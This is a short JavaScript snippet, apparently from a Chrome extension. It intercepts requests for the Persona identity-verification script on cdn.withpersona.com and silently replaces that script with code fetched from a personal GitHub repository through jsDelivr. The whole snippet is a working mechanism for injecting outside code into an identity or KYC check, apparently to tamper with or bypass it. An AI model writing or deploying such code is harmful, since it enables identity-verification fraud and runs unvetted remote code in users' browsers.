chrome.webRequest.onBeforeRequest.addListener(
    async (details) => {
      if (details.url === "https://cdn.withpersona.com/vite/assets/inquiry/inquiry-BqPZ-YU_.js") {
        try {
          // Fetch the replacement script
          const response = await fetch("https://cdn.jsdelivr.net/gh/clintonmachuki/another/12345.js");
          
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
  
          const newResponse = await response.text();
  
          // Return a modified response
          return {
            redirectUrl: "data:text/javascript;charset=utf-8," + encodeURIComponent(newResponse)
          };
        } catch (error) {
          console.error("Error fetching replacement script:", error);
        }
      }
    },
    { urls: ["*://cdn.withpersona.com/*"] },
    ["blocking"]
  );
  